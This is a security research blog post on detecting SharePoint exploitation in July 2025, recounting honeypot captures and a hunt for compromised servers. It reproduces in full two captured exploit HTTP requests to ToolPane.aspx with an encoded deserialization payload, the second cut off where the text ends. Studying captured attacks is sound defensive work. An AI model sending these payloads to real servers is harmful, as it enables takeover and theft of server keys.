+++
title = "Using their own weapons for defense - A SharePoint story"
description = "Exploring our adventure while building detection for SharePoint exploitation and vulnerability."
tags = [
    "sharepoint",
    "research",
    "honeypot",
]
date = "2025-07-23 07:00:00"
categories = [
"Research",
"Exploration",
]
keywords = [
    "sharepoint",
    "research",
    "honeypot",
]
image = "cover.png"

+++


Exploring our adventure while building detection for SharePoint exploitation and vulnerability.
<!--more-->

# The ZDI moment

We dealt with SharePoint before, we know it's only used by small organizations for which threat actors have little 
interest in, that's why when we saw the following tweet, we decided to use our good old friend [TcpTrap](https://github.com/Minuntu/TcpTrap).

{{< twitter 1943256506675401106 >}}

Of course, a big shoutout needs to be done to [Khoa Dinh](https://x.com/_l0gg) for pwning this robust piece of software!

What TcpTrap does is really simple, it takes TCP connections, and tunnels them to another server - in our case a SharePoint server -
while dumping all the traffic into a pcap file for later review.

# The Eye.security wake-up call

We kept watching, for a few days, then you know, other things need to be done, the weekend arrives, and the sun, and
the Belgian beers, etc ... We forgot to check for a few days.

But our fellows at [Eye.Security](https://research.eye.security/sharepoint-under-siege/) didn't!

On the 19th of July, they reported SharePoint servers being targeted and disclosed multiple IOCs.

At that moment, `spinstall0.aspx` was of particular interest, the massive exploitation going on was basically
installing a rogue file meant to dump SharePoint's security keys, which can be used later to take control of the server,
even after patching.

As we woke up on the Monday morning, we knew what to do, fire-up our scanner and start indexing which instance have been
compromised.

We decided to start sharing the list of compromised servers with the community.

While believe in responsible disclosure, we also believe in transparence, for organizations and institutions that have 
been compromised, hence the IX part of the Leak-IX - OG's will know it's not a 9, but let's not diverge.

Oh yeah, also our honeypots caught this, which got people overexcited for some reason:

```http request
POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Content-Length: 7699
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Referer: /_layouts/SignOut.aspx
Connection: close

MSOTlPn_Uri=http%3A%2F%2Fwww.itsc.org%2F_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP=%0A++++%3C%25%40+Register+Tagprefix%3D%22Scorecard%22+Namespace%3D%22Microsoft.PerformancePoint.Scorecards%22+Assembly%3D%22Microsoft.PerformancePoint.Scorecards.Client%2C+Version%3D16.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D71e9bce111e9429c%22+%25%3E%0A++++%3C%25%40+Register+Tagprefix%3D%22asp%22+Namespace%3D%22System.Web.UI%22+Assembly%3D%22System.Web.Extensions%2C+Version%3D4.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D31bf3856ad364e35%22+%25%3E%0A%0A%3Casp%3AUpdateProgress+ID%3D%22UpdateProgress1%22+DisplayAfter%3D%2210%22+%0Arunat%3D%22server%22+AssociatedUpdatePanelID%3D%22upTest%22%3E%0A%3CProgressTemplate%3E%0A++%3Cdiv+class%3D%22divWaiting%22%3E++++++++++++%0A++++%3CScorecard%3AExcelDataSet+CompressedDataTable%3D%22H4sIAAAAAAAEANVa23LbSJLt3stEzMzu0%2F6AQs%2B2BJCiu%2BWQHUGQLIi0CAkgUSAw4YjBzeIFANm8i3%2Bz37MftXsyCyRlW7Zlz07PrhymKBaqMvPkyVNZAH%2F6%2Baeffvpv%2FNBv%2Bvm3f8KL1XtYLNP8rBkuwxcnMp0vRtPizcWZRv9enDRW2XI1T98U6Wo5D7MXJ3erKBvF79KH%2FnSSFm%2BiX34Ja3HtlX5ZvUi1Xy%2F%2FlRb%2Fj0dr8ksvXZKtPw7yrBcP0zz8M941Rx8%2BmPMw%2F%2FlnGvvDP%2BPlP%2F90tV28XvAlJ9s8KxZvTk%2FVm9dbvB8ul7PX5%2BebzeZsUz2bzu%2FPK5qmnw%2B6N2rZ%2FbX5IoHVN6ereVGutniZj%2BL5dDH9sHwZT%2FPXuO6luur0ZJS8OV1M85T%2BWqTL07f%2F%2FqeTT37IrTRL87RYnhRhnn484USt9Lq9KIN9c7qcr9LD5%2B4ibazmc0y%2BmcZhlpbDT9jZ24KLsyzd9h9m6ReuOlw5nI7i9CQfFbdxvJoDJA12w%2B3%2Br1URTVdFkiZfMvflEIfp8ItO%2FpjDn85apL%2Bt0iJ%2B7pSn3ZxtigPShD%2F58Oa0pGBjmmVpvASnF2dmWqTzUXx2M1os%2F6r%2F5S%2BPWdpL52vguDhrF8t0XoTZWWs7Cwk3bx7OZun8r5XDBC%2BNztz22c10IabzPFxiwouT49iPVJFW%2FVD78MsHXU9qWlgN37842BoVyXSzUE7eRmPEQm%2Fv5tP1KCG7d%2FN0ASxCClGgmtLNdD75AReqevSh%2BmvtVZhUX12k1dr794eYPgLof0Ej3r8%2FPVlykpDLsHighJ1%2BzODz55Lo%2FPtYxNc%2Fn6t8ecm2r9Xh%2BaEQv1TT37b7FVsqStaxt3%2F4F%2Bjkf5lXCdTzfv5a%2FQrzHxI%2BNUct8a05e0Mv1%2FqTAvlID7%2BEAenJSek3aW4%2FjLKjSM6nm9s5KM0CVl41DBeNYVjcpyDFqFik8%2BXXdewKWnDYLkbf3i9eYtFlCOocN5nkGbvMt1jziXTcfngsFZ8X8e%2Fg8clzamPvdkuR8Dk1eIUYKJw0wRuEunzQnlu53XQ5nCYWFOttExI2H4XZaJdenT%2F6%2FLtWugtJ%2FQDw4nt2k1J%2Bfo8UYPHXe9lLXi%2BW81Fxf%2Fr2fNN62DS0et2u1%2Bt35%2Fj51agffjYNeu1JqxZXnSzqbe5lLh%2FiSraOxpp2M66vuo2LzU3DaCbeVksGnezOq2XJwHnwvc2iLQzdz7czX1tmqXTWYUWu7rx21aq0dH%2FnVrr9yc4y3c1tcyLYfts23Gq2S0y5vJlY68jcZn7VmUWV2u5mkmQRbIded%2BVWLh9wzcStSM1visjT9%2F7V%2Bsl1Zxbl8aJt6jsf10VmNoJ%2FXjDo7ELvcnXXt5XP4%2Fqi3bL06NrR49y9xNo65g6jxubevZYjzBv3KrImzct54F1c%2BuO46vfl2Or729t%2BVwv69YtbTFFgyWZUlaukPmxGFX3jA4f4PjnYNNxMCzx9V69368b9yKof8Kzh%2Bu0i8CyNrosfatcB8IvzbMzxD4wh3u8Q%2F3HdvL719GU%2FHVhYU1u5VQeY1ArEuIwr1jomvEd%2Frzxhin3PnKjf08uk%2Beh9i14NxFivN%2F6fx8ih3Awqj%2F27aLazQ0ytwNtmQUVogbQoliH48sofMFfbiHcSDNodgzhttFpHjHyTXofDzdp%2FMDZRNcniwppirUW7oYsot9YBeG1XLpeRJ1ZBw3hnu52Z7SbC9qyqnW8NR2RGfyIasiXarivGgdbZ2G6s2XJWtb3EcJqG0XOFEbrCtF3hJFpnYLtS2NJy7ElgONXECFqiEU6E8DVx57ptHes7thRVe2IZTn9oSF00vJZoOa4Ywf5vtutYGC%2Fs%2FNJw8qXR95KGnIhWqIm%2B63Z2tutqtltz7HxmOC3dkBiPNXENP2SitbawL22ZOXY2NByZGX6eNODfdbfF9ivKfqdqF7BfuTS8QdKwXCGwfgj%2Fb2w3cLC%2BYU9g39UNH%2Bt3sX6iCQn7LazfQXzwL4N%2FieHS%2BERc9%2BE%2F8Olh%2FbEtA8MuHLZP8fvAJ9CEG2ht%2BB%2FMMV7l9YGPdBlfEWnCQ%2FwLjBe2dAp7AHyBgSwSA7bbkuPr4BqMeQL4ztg%2FmQkjBr7ID%2FlX4XGZVe0B%2FOs7RiCBf4vtO%2Fhfhf%2BwbyG%2BJfCThgf%2FE9j3XGHBPmIPLI5vHCj7mmj0NNECvgPEF%2FD8vX3PMgL4Hyn8R7A%2Fh33kP1H468LwwR%2F4ZgKfPuZv1Xyp5lcsQ0pB8VF%2Be5jfh%2F2A80%2F8mIB%2FhM8x%2F1vGz9UxvwZ8hQG6NawW528YaK0N84P4VRjAB%2FEVSaMHfLCOo%2FCn%2FBP%2BS6MH%2FniS%2BSfAD8o%2F1o6xxqVjFwp%2FF%2FywNWGCnwPY93m%2Bh3LLgG8r4%2FiRfxP2vYTzH18Av6qddTAO%2F6pH%2B5i%2FOuBfzDg%2FtH4E%2FoDDhI%2ByLzvAXwLfpeEC%2Fz7wQf4pfgF8Da6%2FLGD%2BE74W5gPjnqq%2FIeLDNcRv75LHfcX%2FzOb6Yfww30L8gvJvpK5oYf4E6%2FcO%2FNvnHzikLXGN%2BAL410H8O9tzkF%2FJ%2Be%2FrnH8T%2F6n%2BEV9C%2FHbswUzVP%2FiFuVT%2FHvAHtrLK%2BKG2mf%2BYH0NffFV%2FAxV%2FoOLXdK5%2FYNMGPwPFH8QG3tsTneuX8t91OX%2BwT%2Fkfjjn%2BCerPzQwX8cO%2BifURP%2FGf8p8o%2Fpf1R%2Fojlf7MVfxS2YePiJ%2Fqv91X%2BF9z%2FRP%2FMsS3Mzj%2F4C%2FlH%2FVD8SVV5AfjCfM3MBOqP6ofip%2F4ayj%2BzYyeCf4LQfjzfKw%2FxPw15iv96BsGuN9wNOYH9KMj2b4nDOY%2F%2BOdmjJ%2BIlX68%2Bhr%2Fj%2Fwj%2Fe1w%2FXlYv6z%2FDOPYA%2BSY4ysyrl%2Fm%2F7H%2BOgf9Jfyraj7pL%2FEP%2FqF%2BHcn6M0H9gyO%2Bsk%2F6Cf9JnxNrzz%2FCn%2FRHKvyRe4o%2FGPP%2BMRbAT1L%2BDegz6R%2Fpj8b4eqgP4g%2FpbyVh%2FSn5D34PoR9ZwfELaUjgDx8p%2F4Rfhfc3wr8vVP4HzH8T8d8iPtLXDvOvECr%2B4iP%2BbZR%2BoX4zg%2FNH%2BtRX%2BkP8byj9p%2F3PeUJ%2FRE3pP%2FGv1L8K2yf8oV%2BMv8P8zpFfLVP8Az7grgt8Hg76Q%2FFL4COP%2BMP%2BWsWfFGwf6%2FsYd7U9%2F4j%2FgVD2Lfaf8IcOUH7IfnjgP%2Bkf7BP%2BVF8ux0%2F%2BI78e9okc%2Bc0t3j%2BJf4mKv8n7J%2FNf7T%2BED%2B1%2FvqoP4r%2BaT%2FWB%2Bintm2X8c%2BYfxTfusH34z%2FaxTqD0l%2BwjjtJ%2BH%2FxPsL7af9rEj4LjJ%2F1B%2FQRC7R%2BYLwPG5%2BP934X%2BYO5efzzuP9h%2BcMg%2F9kDqf1yln3Kt8BeH%2Bo%2FL%2Bk%2BY%2F0OD%2BUf7L2qb7EODSH9HZfzrvf0e8bPC%2Bzvp5zhR%2BI%2B5%2Fsk%2BuOkPGP89%2F3Zf0R%2BqX%2FDDwXzan4DfbvjN%2Bi%2FjJ%2FtD1X%2BRfgvFf%2Bg%2F9Q%2BP6r%2Bl8IWGUX%2BI%2BkN97f3H%2Fkf8GkquH4o%2F4%2Fw1YLvUrzbxt6P4I3j%2FYf5POP%2Fk%2F9P8a3H9k74h%2FzJA%2FgvOP%2BqQ9reu8t9zP9Vf8I%2FGvWP%2Bq2zf1Qsb3DjYP9afpfY3yr%2Bqfx%2F9FelP2f%2B4HD%2Ftf6w%2Fqv%2BB%2F4%2F4T%2FHjGuI%2F9i%2FCH%2F0n1R%2Ft7xcq%2F2X%2FR%2FYxjv0bzY9A7J0u1w%2F13%2Fv%2BU%2BF%2F7R%2Fwp%2F56Vt33f7T%2FoX8wpeq%2FaP9fH%2FTXXDL%2F0H9z%2FbuKfwHrL%2Fc%2FgvWb6o%2FmK%2F6R%2FmE%2BxU%2F5y3j%2FaR%2FrL1D7D8W%2Fx3%2FC%2Fd8w0R7j73B%2FRf5Hqn7J%2F1rZfxTUvzP%2F80P%2FSfyfKv5L1f8%2Fqb9Di%2FvPXFfxg7%2F7%2FRPjvyn8MZ%2F3n4z7d8R%2Fban62z2u%2Fx7ON6Q%2F6J%2Bpvkdl%2F20x%2FrR%2F6Bnvf6gfzj%2BuqfH%2Bxf2PxfGT%2F7F76P93qv9A%2FZJ96n9Mdf4IVX0TPoGqP8SP%2FRv9D%2FGP5pf9F%2FCn%2FnNsMH8ofuBP%2Bl%2FiT%2FqD%2FYfOHwp%2Fqr9ryfkVF0f9L%2Fdf9I%2Bu6q8sxa8n65%2F3F%2Fjf4v7Dc6pKf1X%2Fhf6zTf0f7Ael%2FkBfhJoPjbt1RbOnekicnyyH44c%2BUP7p%2FIP9gfAPyvrE%2Fkn4S3U%2BK%2Fcv%2BI91W8AXsbmZ2r9MnM9a6vyA9V3g12b%2BSeR%2FVJ5fMI46ErctbFFu5xb9yQX3r4%2FGcYbd7899NY4e9NE49f%2BS92eqb6n4cxyn%2FrcF%2FgF77r8wTvkXrM9Uf5hL82ncUvVJ5x%2BD8Zfq%2FGwmKv%2FVMv6C%2Bv8esPPK%2BBPOj9AP52%2FoXw%2Fa2oP%2BwX8D%2BvZO9aeJ6q8KtT95Gfe3pB9Zia%2Fk%2BcfzeQMcofMX6esrdT5AfaK%2FtHfq%2FJGo%2BpggfvB%2FiPrGWK7w71eYf8R%2F0gdNnX9xvqbzi47%2BI2d9pvUnNtd3GR%2F6Fxva2qP%2BG%2Fx2VH1jfSfg8zXpA%2BL3K8meH9h%2FBfynHh7nT5x9DvHBP%2BQ3VPVZ3j%2Bg%2BOE%2F8StS82Ef%2B4JrY34G%2F8Ff9Ki0f6WqvkPED%2F%2B72n7%2FInwx30hU%2FkZKP%2Bj8Rv23weuTfuOaFvC%2FC7g%2FoP4G8fVL%2FDAeqfsjUukf4Qd%2BEr9RHzg7G6Hqz8j%2BcX3aP0nfPL7%2FsPcP%2BbHoDI0ecGnYutJniq%2Bv8C%2FzP1PnG%2BzvdH8D%2BF8r%2F8k%2B6sdDfJR%2FxE%2F4YbypzkfU%2F8aayu92j5%2BBvo7GwW3SX%2FCD9B3zH9lvl%2Fkt7%2F9kSp8qS%2B7vk3L%2FVPdn4B%2FhP3C4P6X8kr4hf3T%2FqFHqZ4kv%2B0%2F29%2FypcP9k%2B9d8H6tiLYO6Lejtd94P43uFjRauN2WBscyo6FliDtdBs34deVILzctJ1%2B426zvjcO%2FPMeUC59VhYsp%2BMOjMfG87S3PB9xJ75uUiMOXDO%2B24puPVtLiYrA%2F3kbNOFuT7%2B8gXq74nl34uH3peLY%2F0L%2Fr6t87vqJukkw7HbE%2FpV4s%2Fa%2F7NsXEejGunFptu2x9Yu8DTR9H1xExM8RBUpNYqnGGcJ1ki6BppxFUri7zOIrVrmj%2FoFMHAcdOBkfVzsQzs2RJ%2FT6OKc%2Bt7etb0PrNn1O02%2FreaXfFd%2BZ4%2Fik9EhfOQ2v4N%2Bb6od44YFHLlV%2Bq7f%2BT93hvxf8O2Y2bDoFJbA%2BOZX%2B2u3OvO2q%2FIXfywuT%2Fw8e%2F5LON%2BQ8y6iQbWOKp2FqHXRiwB3aMm7l9ayhZsbu7tqlwk1%2FIh6OurYCC1OBcL%2BGYnHs2zboJB5kaVZRaN9ZG1S4aW19WtcavW3TlZt3lfa9z71u%2F0bMls0r13Y%2FZtnDf%2BHdeWtKhOtIZTV3VL9%2FEbl0eO5DJHjYwTE76OahbVH3LSifJg7VboGZVYhIPZkMcnw3VkOll8H%2FNaqua2x5p0a8PIczt2ZTvEZ1yDDWnN4N%2BQ8bVn%2FdBLVqgtyu1DY6LTvCzOuP5tB3Gzdmio%2FapcBlSzmxbVq1Gvd9vN43MYrnlPx4Fow9pkKW26oF8mC3qz9gwuGn3SmaQxfKpmPvvsne1LWvru0V4BfIoovwSfs3H8ULPj%2FHIcQMfaQuH%2BTjzxPO%2Fzz2ZKY6dGQz1%2FUnHw%2B%2BTwLKlhc7AmP3ip65%2F5Zwx53hx6rnV37Xt69hKTjvaeHV9IC3SP8XWiwt51R8bBh%2B%2BN59EDI9Mk96%2FFwe7ev3BgraN%2F%2BHOySZc5dF%2F%2BdtjnjsrB9ObqvHy8%2Fexv0%2Fzgo%2FQr9aWGdvlg%2FNGj7sfffDh9e3X%2B8YXP%2BsbOd3%2FF4Or8O7%2BA8dWv9sw2xRe%2F1EPfaHnyqzxf%2FjbM1fkn39x5%2B%2Bf%2FAT299nCZKQAA%22+DataTable-CaseSensitive%3D%22false%22+runat%3D%22server%22%3E%0A%3C%2FScorecard%3AExcelDataSet%3E%0A++%3C%2Fdiv%3E%0A%3C%2FProgressTemplate%3E%0A%3C%2Fasp%3AUpdateProgress%3E%0A++++
```

It checked out with Eye.security's assessment, deploying a `spinstall0.aspx` from the same set of IPs, feel free to read
more about this payload on [their blog post](https://research.eye.security/sharepoint-under-siege/).

# The grind

If you try it, there's a good chance the exploit won't work, or will partially work.

We knew all the SharePoint servers on the Internet have been sprayed with it, and yet, only a small quantity of them was 
showing the file present.

*This is not its final form, this is not the full story* - we thought.
![finalform.png](finalform.png)

The truth is, we're not Windows people over here, so after the first frustrating challenge of installing SharePoint 2019,
we got nowhere because we don't know enough about this sh... magnificent software eco system.

We kept digging, though, but our resolve was quickly fading as we couldn't get any feedback from our test VM.

# Just listen

In parallel, we kept checking our honeypot logs, for smarter people, and whould you know it, this happened on July's 22:

(hello `157.245.126.186`, and thank you!)

```http request
POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Content-Length: 10117
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: /_layouts/SignOut.aspx

MSOTlPn_Uri=https%3A%2F%2Fx.x.x.x/_controltemplates/15/AclEditor.ascx&MSOTlPn_DWP=%3C%25%40+Register+TagPrefix%3D%22Scorecard%22+Namespace%3D%22Microsoft.PerformancePoint.Scorecards%22+Assembly%3D%22Microsoft.PerformancePoint.Scorecards.Client%2C+Version%3D16.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D71e9bce111e9429c%22+%25%3E%3CScorecard%3AExcelDataSet+CompressedDataTable%3D%22H4sIAAAAAAAAC%2B1cW5PayJKe2cuJOHv2bf%2BAw68z4%2BZqNxP2RJSEJBCXbnERoBMTsUiiBY0EmJuAx%2F0lG7E%2FdPfLLDUIutv2%2BJyxd3atjqZ0qcrKyltlZpX03ffffffdf%2BOgko5%2F%2FQf8NNv71XoUvSoP18MfX9ij5Woyn70rvMrQ348v1E243ixH72ajzXo5DH98cbtxw4lXG%2B078%2Blo9s5982ZY9Iqvs6V8YZS5Lv0zAf%2B3FEz%2BaY%2FW1Nef%2B1HY9sajaPgXnJUnd3fGchh9%2Fz09%2B9M%2F4ue%2F%2Fvx2t%2Fp5xVVe7KJwtnr38qU8%2BXmH8%2FF6vfj56iqO41dx%2FtV8GVzlMpnsVb9Rl2Af6kYrH72%2Be7lZzhJoq5%2Biibecr%2BZ365%2B8efQz6v0ka718MfHfvVzNoxFdrUbrl7%2F8y4vkIGxG4SgazdYvZsNodF7vhQTwc3WVjPHdy%2FVyMzre765G6ma5ROP63BuGo%2BTxCfxDF0BoEY52nf1idP7wWGE8n3ijF9FkduN5myUokUEvw93D1Wbmzjczf%2BRfAH9%2BHOPR%2BBKT34TVZeXV6P1mNPM%2BUvNpXBbx7EgzoiT1%2BO5lIkPqPAxH3hpCuXpljGaj5cR7VZ%2Bs1v%2Be%2Fetf02LWHi23oNHqVXW2Hi1nw%2FCVtlsMiSa95XCxGC3%2FPXds0Bu5r7rVV%2FX5Sp8vo%2BEaDX58cXr2OWqQyd8V797cZbN%2BMTPMD3%2F98djXZObP45VE8sa9x1jo9HY530586vd2OVqBFkMaog51GMXz5fQzUMhn3bv8dfH10M%2B%2FLozyxV9%2FPY7pjEB%2FByX%2F9deXL9bMJPByONsTw16eS%2BfVR0Tm6pNkhqt9VA65ViJST%2BjP1VGBLjTvWeCPAUp82ZL88qd%2FgqX6j%2F%2F8%2Fq0PAxYsf5bFMPos2yPbSBAfa%2FPQ0U%2FbbNpGpUzSxQBJyV8kWJKR6wzd8GSelvP4ZgkRZGOS1BoPV%2Bp4OAtGYOJkthot10%2FalLdQ2aNZnnzcLv8EWOshWH0y5v4nWPNn2H2h2Dd3aUV%2BrGJfANEXH8FUk7L0jFK8BaaE9MjHCQa03mc%2BoBKN0Xo895swFL%2BUYTmWk2E4OYzeXqXuf6zx7ZDsDIi1%2BoiWJrr9JSgI4D8%2F2BT%2F59V6OZkFL3%2B5irX9pKIJYQkhbq9wXCs4S45YpV872yx6%2BVbotov9Ya84dfP%2BoT51tl6UPdRVpef0zcOwV9rcdqxNQy3E9XuxqmrNrFtpZb2oW3IjO%2BtXzLGrxkG3Yk9cI7xv5%2ByibZSWTq9QGtx7%2BUHHvm92BrubTiPjdEThxuoyHlX7A31P9ULbKB18dd3xDT3jWBiHEK1uxdx6hr33K6E66Pkq2o292bQigio9N0VMxXWZfncHj3p5ZvwWn9%2Bdxl92c7uV02tmaLzevlhxesXQi8L7%2BnS3QJ2gYa%2Fdbj48%2BIa9rk9Lk2Fk3%2FsYt9tv3rt5czXsVVdV3Qm9WXPh5gqlpqQX6BYHVt5e%2BRV773SyG6dvZ7xIX4G%2Blt%2Bjds260w%2B7bm4duvfZSfPgj5u9RrZ5rxUbh1bYKAdFNOExKWFpQf17sX3n5cLXjjW%2B8yN7j%2FOtG3RRI6iqFtOiRj9qQI0E85opKKYMR7WIKMJUuJga8h7RS5hcWUxNeW8u7zFdpw36LVuDiqSzJunJMDxVtTJ0AnTxa%2BidUb%2BZcXqZjZ0r7Yc5Z%2BXmvY2VK609o7QBbTOdXmnq9OK%2FA80yh0bPjBqHINuM9GnjMICcNbIKj1F5f%2BRZ6EO21pFrlPL1aXPr9pUt5Hfja9mtY9iretgkfo8hw68H%2FRbhs7FIHvrOAvLW8fvm3s35Y8DqOL1dOMi3tt5kfTvALIjz1PPuspMz35MsdXP2ftjTV8P%2BInR0M3SknGqAFzvWeu30shPomIb%2Bxl7c0CsnebTdKMyM7EucilXI6dTpV28kf66ZP5K3ms4yIvnX4uct7k9RgiOjTE3ykoQFt5jn3Fxt8S1T57paNQWrL5%2FzA0W1TrAMKT9DCWuegrXi5xWJVz0Fy5fPC%2FxACvXuKCuQj5VrQK8MyPOssWkb%2BmFYaY0H0S5UGO9Fw83p01ako05pr2SPslOVsqXvQRuL22lN4qvlRaXcsNcKvWBcHfSb8y7rTYvk56CEztit2KFHsOOGUKwuROwD%2BHRZbsYedM7Un7Ud5tP936%2B6neBKMBnnNalD0zumR5uJc1tmegqip9qx3%2BOqcaQp7JcQdW58UrvfcMiWhbtNUBBrMWtW3UCBSR7bxnjh7ZUYeM6gY%2Buq0Ry7UXHrq8rEaSt7v1cIhvhvaaVO1SBd6W7KVqbGBoIPxWoBmQ6xs2k27nInHAVJ6QT8tyAPCosU2xoez4Rl9ySZcqCyMX5TxlqKNx%2FSOiW1cDSEVe3Kysqp8rFBCggfNWuLmyzPXKkWJACfOBhTZtLffNDILztS6YYWXNwsZpz%2BmA2pInGX2si%2FTL%2BL%2BoznBjqwH8Sn8Uh68q%2FU87NDEqs%2BM0PYwnuRCFnCGfWMSamDoFkX6MqjHNQfyCQRBYyuqKkAW4FSPebC5x%2FKKlaEInUICGlWdU4sUicBc1MNBkUnJjo5W5rb1OiahlJTomsyRTU3poaLPbX1xKrizWD%2FKmJONk2dFxf3DFib07wJmGS3amrs79dUv1In2YlrYorb8znZLtShebZWE2Tv5nUlXz%2FIOsTC%2BSM4RqxhpgxuZJu5rEP4B8AlWimESzl%2BCm7NhcsS15iS7xvMpPajvneyjvaBOmZLBFSn%2BiR%2BecxPwK%2FzJH7juEz40STzGD%2B4DTGNW17XFBK7xZbmEnXcqNT2cUvJXZPe1RY8Z2kN4As%2FQom1oDonJqnjqlpTJG2NNF47reLuGO56XyrYmuVnpTfYqGpWsFJ2WtXdkQAuPW89ZRwrxM8gY3qzgSYqyrYi8dA0q7U%2FgPmecj13d4THvKO0NF1Xhk0W8N41CUDNVwaEY0cJvI7auq7fs%2F%2BpddSxVtPHmjmnMl%2FPQRZjOjcUzXD3TPeJZs0dbxzooqLS%2BVCznG2V%2Bp%2FHNH6F6%2BerAwW8ovMKt208tPVTbUfUluys%2Br7aUsfXZurZHXBBO6Lz%2Bwbr6xB1JkHENCsVyua6IB7kHrSfnenBnoY5N9yY5v%2FFtkb0Wss2tUBRSABYFcoZkrgiXfqkYszX1FGFzIoyTwU22yc2JQ6NU1YgOipZgjWKz59bYbNmEczE%2BLMvUBlk2P87iEOjQ7JAFRV2JjoEX23%2BgJ8CwVsTLLXZQfyxcCMfeofDiIkUHul%2BNWujCcsQ91DN%2BHa7S6fqgGSaB6U2VdjASWpA%2BNcrOkrp55Rfm52GYJ%2BI3UnGSZpyBnVxnbg%2FCbDaaSYaYOoR6Gcg7EDkqPS5nIv3QoVPRGZMlq%2B5HACIxvVNS5a1WJbL5P4%2BkOW1VRkJayB0q87lTVK2ktITVa4XBjVNBAOxSK5XlrzeCllmYirn4iqoh1RWg1sunZjKgXhvNR7o9GDPUTL%2FLKGwH6nLa0VGIEI1DDAVNgZqohG3boh%2BDaZLUqoa%2BAgUUWYCMSZ65i15v2SJSJTJI9BqojwFcA1DR7sAHizKG0vLUWkJ7Zqetyy9TKWdlMOkvAv0CpVTS5azWN7fCr1OZSbQLSqvLN0WhgY6m0OBuHktlDtRIXgml30quX%2F9np47sfleVDVxJ6o1USW45obK95aZIY98b5mvRQ3jCWqqqGugzI1JZTO%2BaVLZCuR1L7kfxDdtOS6jT%2BOOrBufylncwPg1sbBQQvTVWC1SqcVlVdSqiVv1%2BAhPQpk6NCF99seTshaT3KWO8q7p5lpZ1%2Bj%2BICgWj7Jzx3BW9ai1coWiCyN7GCC2Q2wyEQ%2B%2BsKUk8ZAl6lEz4%2Bar4hR%2FmVl3hhim103iwHCF2KeDf%2FjHiHNiBX50Nh72dmP2t0PyT%2FRCEvccrH4LMWA48futUOgPsGxuQ3UGUYg4q1U8q5fC%2B4gj8g1OryraFdSDjw444QgThpOzM%2F1MM%2BuRXzSz5HMdeM0QY4Q2fPsd4sCprJdN7gfA2bDH3hQxeFTaC22c8StK2%2Bk3Y8LZsZSZ02%2FddSP7QHGvl%2BsKK4fYsV8VrV4xN%2BybiEGz3F8LcDtGaQZajF2ttUfcSTQx8ezQgKsu7ZwnWujH7ekZQbhHzbEvlJqbCzfC8ENfLzUHveYceZGwA1%2F%2B2H%2FCg5YR7ilOQb6imNQvU9xK8fgTzyh2ucdYDrhXdvOIlYWEZyPPM8w0tz7aJXVtD7Fu0uct5WiYb5H%2FEEsl9C117GO%2B4pRfSmCcrp%2BLrUAP4CnjsUjfjyylAnx0d%2BYsgOsG8rDxdQfxWcgx46P6XTzvZRFT6yybRHPwIYt2hO8W%2FDQvrrVh0vegbxbxLIN8UzKWdYj%2BJT2Qm%2FB7XYGcRs7pFlme2t0W8kbK1svpyIt1BfAgGSCZOMaXkIvoGF9i3vXyzdBFfgNwOc4VeqvoUVv0Z3POQGmivzn00nQjZys0kgmmswFdmWG8RI%2BkjgV8ILdGaWpFOvULWXK2Q8hgKicSDiZE42I07PnI6ek8VqFlx4PcGHBtipOR75A0eODTALrgIC9H9yjfd1H%2F7PlTbZJ7GuDuR33lBOeJ%2BxewH%2Bk755ESPiQ5ALQDXQzkT7ocrwo7byJvBjpGu6yH%2BBR8nArNLgxydixpD3tX6a6FmhF1C6b%2FN5Qwv8CxgPkHzhFHPspeGNeY1JRQVKoCOrMQ6Bs5huBz4KMkP6LUCeBHGRkxCCRcWP6tMAZUNqg%2FJ6Z%2BGmJA%2FhLwaDEeU%2FgZVL8hbgL0X1lh3lVK5GeIcoh2U%2BClZKi%2BGysRlR2G62H%2BVO5pPnTJE9TgMweAXxkI0PogyvAPhPKGnLY7xk%2BUb%2BBTmZkGwVnDBxe%2BBbg0buoX9AFea7p%2BhIdWMkB79CPxBt3GAvqDJEjA4%2BL6dI1x0PNYKdJ4QFfYd6I%2FnAoaB43T4Ptbos%2FIIleK%2FE64VhUMETyuAz%2FgtafnGMeG4KK99qnt7W6B2mMc3H6fppuX8H0QS3oDT4bDfMd99zQO0LFB%2FQKORvXn1D%2F0P3xMV%2BXuA3xfczuim%2BQj4w98oF%2BW7Bf9gI%2B4bgBfeQ3bciA8gP86oSf4hLg0QPmof1VMsiS7sm%2FgOCZcGNYTvAFtDkeeG49pDVyLTLNExhzGmXmAa9CWSoKDMIng8H3IEtMaOEpdKqDdE2N5LJOlDuJLiU8iU0wLeMQCIQ7mcjl2yB6NR2fZ3ic0Y3weyaraPdN1O%2BEJ4CwSHj%2BSmaBKfttn6T30BrgFSi6RT8YJPlYoaSVxhl6xnqOcIP6R%2BgkcPqO%2FNY%2BxpT%2FQ8DWP3UrGXlXd7oXu1QPk0kC%2FQYDA%2F2l6lLBgQGlLhDcF8vk3BBtBGcbG8rEivrCcAM4t86crbQfgSFsWE78sshHQAZZ16Eyd6oH%2FXepnyHJUoPYTgt8gnSx3ST7zpCsNS%2BxIzpoW8IAc4fkYumV%2FYDzg84MuDUgeZtR%2FSo6YF6jffKTD2op4UBQ66RxsaKq%2BUMMKj4%2ByexW2GQ%2FjOYNrke0gOSebC3kVqv5J42d5hS2mpPKb4L7iqM7dm8zrDOa%2BTnVYng6hauv8wrPH00yhOi1j7lIUFaGAFWAnTunublex1fs5Ba1tzUK2T6naeA63dkr3%2FDKtMQWFm4qQZRlxIV9bBQrfbzgXRzGHUl1QfKFNMgyrIWFlxZ7SbWgTo40SU%2F9Y0YEBnnZvlDaV0xuyqto0c6PZGqxs1asoGY%2FalQOCofuMT4%2FWOrSbSivGQoWmlMeDirqrtspj